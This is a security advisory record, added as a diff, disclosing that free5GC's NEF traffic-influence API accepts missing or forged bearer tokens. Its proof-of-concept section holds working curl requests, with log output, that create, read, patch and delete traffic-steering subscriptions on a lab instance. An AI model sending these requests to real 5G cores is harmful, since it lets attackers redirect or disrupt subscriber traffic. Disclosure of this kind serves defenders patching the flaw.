@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-3p28-73q7-45xp",
+  "modified": "2026-05-08T23:19:47.000064Z",
+  "published": "2026-05-08T22:58:59Z",
+  "aliases": [
+    "CVE-2026-44326"
+  ],
+  "summary": "free5GC's NEF 3gpp-traffic-influence API is unauthenticated; missing or forged bearer tokens can create, read, patch, and delete subscriptions",
+  "details": "### Summary\nfree5GC's NEF mounts the `3gpp-traffic-influence` API without inbound OAuth2/bearer-token authorization. A network attacker who can reach NEF on the SBI can create, read, patch, and delete traffic-influence subscriptions either with no `Authorization` header at all, or with a forged bearer token (e.g. `Authorization: Bearer not-a-real-token`). This includes creating `AnyUeInd=true` subscriptions intended to affect group / any-UE traffic steering. The route group is also reachable even when the running config's `ServiceList` does not declare it, so operators who think they disabled the service via config are still exposed.\n\nThis is the highest-impact NEF service exposure observed in the lab because it enables unauthenticated state changes on traffic-steering policy objects rather than read-only exposure.\n\n### Details\nValidated against the NEF container in the official Docker compose lab.\n- Source repo tag: `v4.2.1`\n- Running Docker image: `free5gc/nef:v4.2.0`\n- Runtime NEF commit: `5ce35eab`\n- Docker validation date: 2026-03-11\n\nNEF advertises `OAuth2 setting receive from NRF: true`, and its `ServiceList` only declares `nnef-pfdmanagement` and `nnef-oam`. Despite that, the `3gpp-traffic-influence` route group is mounted and reachable with no inbound auth middleware.\n\nCode evidence (paths in `free5gc/nef`):\n- Route group mounted without auth middleware: `NFs/nef/internal/sbi/server.go:48`\n- CRUD routes exposed at `/:afID/subscriptions` and `/:afID/subscriptions/:subID`: `NFs/nef/internal/sbi/api_ti.go:13`\n- POST allocates AF/subscription state and writes traffic-influence data: `NFs/nef/internal/sbi/processor/ti.go:50`\n- PATCH looks up and updates the subscription, then calls UDR/PCF: `NFs/nef/internal/sbi/processor/ti.go:279`\n- DELETE looks up and removes the subscription: `NFs/nef/internal/sbi/processor/ti.go:355`\n- NEF context only exposes outbound token acquisition (`GetTokenCtx`); there is no inbound authorization path: `NFs/nef/internal/context/nef_context.go:153`\n- Config validation only allows `nnef-pfdmanagement` and `nnef-oam`: `NFs/nef/pkg/factory/config.go:126`\n\n### PoC\nReproduced end-to-end against the running NEF at `http://10.100.200.19:8000`.\n\n1. CREATE subscription with NO `Authorization` header at all -\u003e `201 Created`:\n```\ncurl -i \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"afServiceId\":\"svc-noauth\",\"afAppId\":\"app-noauth\",\"dnn\":\"internet\",\"snssai\":{\"sst\":1,\"sd\":\"010203\"},\"anyUeInd\":true,\"trafficFilters\":[{\"flowId\":1,\"flowDescriptions\":[\"permit out ip from 192.0.2.40 to 198.51.100.0/24\"]}],\"trafficRoutes\":[{\"dnai\":\"mec-noauth\",\"routeInfo\":{\"ipv4Addr\":\"10.60.0.1\",\"portNumber\":0}}]}' \\\n  http://10.100.200.19:8000/3gpp-traffic-influence/v1/af-poc-noauth/subscriptions\n```\n\n2. CREATE second subscription with FORGED bearer token -\u003e `201 Created`:\n```\ncurl -i \\\n  -H 'Authorization: Bearer not-a-real-token' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"afServiceId\":\"svc-high\",\"afAppId\":\"app-high\",\"dnn\":\"internet\",\"snssai\":{\"sst\":1,\"sd\":\"010203\"},\"anyUeInd\":true,\"trafficFilters\":[{\"flowId\":1,\"flowDescriptions\":[\"permit out ip from 192.0.2.20 to 198.51.100.0/24\"]}],\"trafficRoutes\":[{\"dnai\":\"mec-poc\",\"routeInfo\":{\"ipv4Addr\":\"10.60.0.2\",\"portNumber\":0}}]}' \\\n  http://10.100.200.19:8000/3gpp-traffic-influence/v1/af-poc-high/subscriptions\n```\n\n3. READ with forged token -\u003e `200 OK`:\n```\ncurl -i -H 'Authorization: Bearer not-a-real-token' \\\n  http://10.100.200.19:8000/3gpp-traffic-influence/v1/af-poc-high/subscriptions/1\n```\n\n4. PATCH with forged token -\u003e `500 Query to UDR failed` (still reaches business logic, not 401/403, so auth bypass confirmed):\n```\ncurl -i -X PATCH \\\n  -H 'Authorization: Bearer not-a-real-token' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"trafficFilters\":[{\"flowId\":1,\"flowDescriptions\":[\"permit out ip from 192.0.2.20 to 198.51.100.0/24\"]}],\"trafficRoutes\":[{\"dnai\":\"mec-poc-updated\"}]}' \\\n  http://10.100.200.19:8000/3gpp-traffic-influence/v1/af-poc-high/subscriptions/1\n```\n\n5. DELETE with forged token -\u003e `204 No Content`:\n```\ncurl -i -X DELETE \\\n  -H 'Authorization: Bearer not-a-real-token' \\\n  http://10.100.200.19:8000/3gpp-traffic-influence/v1/af-poc-high/subscriptions/1\n```\n\nNEF container logs (`docker logs nef`) show the requests reaching business handlers and returning success / 500-from-business codes (never 401/403):\n```\n[INFO][NEF][TraffInfl] PostTrafficInfluenceSubscription - afID[af-poc-high]\n[INFO][NEF][GIN] | 201 | POST   | /3gpp-traffic-influence/v1/af-poc-high/subscriptions\n[INFO][NEF][TraffInfl] PatchIndividualTrafficInfluenceSubscription - afID[af-poc-high], subID[1]\n[INFO][NEF][GIN] | 500 | PATCH  | /3gpp-traffic-influence/v1/af-poc-high/subscriptions/1\n[INFO][NEF][TraffInfl] GetIndividualTrafficInfluenceSubscription - afID[af-poc-high], subID[1]\n[INFO][NEF][GIN] | 200 | GET    | /3gpp-traffic-influence/v1/af-poc-high/subscriptions/1\n[INFO][NEF][TraffInfl] DeleteIndividualTrafficInfluenceSubscription - afID[af-poc-high], subID[1]\n[INFO][NEF][GIN] | 204 | DELETE | /3gpp-traffic-influence/v1/af-poc-high/subscriptions/1\n[INFO][NEF][TraffInfl] PostTrafficInfluenceSubscription - afID[af-poc-noauth]\n[INFO][NEF][GIN] | 201 | POST   | /3gpp-traffic-influence/v1/af-poc-noauth/subscriptions\n```\n\n### Impact\nMissing inbound authentication (CWE-306) and authorization (CWE-862) on the highest-impact NEF SBI surface. Any party that can reach NEF on the SBI network can:\n- Create attacker-controlled traffic-influence subscriptions (including `AnyUeInd=true` group/any-UE subscriptions), redirecting AF traffic to attacker-chosen DNAIs and routing endpoints via SMF/UPF.\n- Read existing AF subscriptions, leaking traffic-steering policy data.\n- Patch existing subscriptions, modifying live traffic-steering decisions for legitimate AFs.\n- Delete subscriptions, denying service to legitimately provisioned traffic influence.\n\nThe traffic-influence route group is also reachable even when the runtime `ServiceList` does not declare it, so operators relying on `ServiceList` to disable the service do not actually get that protection.\n\nAffected: free5gc v4.2.1.\n\nUpstream issue: https://github.com/free5gc/free5gc/issues/859\nUpstream fix: https://github.com/free5gc/nef/pull/23",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/nef",
+        "purl": "pkg:golang/github.com/free5gc/nef"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.2.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-3p28-73q7-45xp/GHSA-3p28-73q7-45xp.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-3p28-73q7-45xp"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/859"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/nef/pull/23"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
